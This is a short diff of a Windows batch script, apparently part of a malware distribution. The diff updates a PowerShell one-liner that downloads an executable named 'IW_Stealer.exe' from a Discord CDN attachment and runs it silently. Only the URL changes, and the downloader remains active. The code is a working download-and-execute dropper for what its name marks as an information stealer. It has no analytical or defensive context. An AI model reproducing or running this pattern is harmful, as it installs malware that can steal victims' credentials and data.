@@ -1,6 +1,6 @@
 @echo off
 cd Components
-powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1193962241616265296/IW_Stealer.exe';$file='IW_Stealer.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1194319576343781506/IW_Stealer.exe';$file='IW_Stealer.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 cd ..
 cls
 @echo off
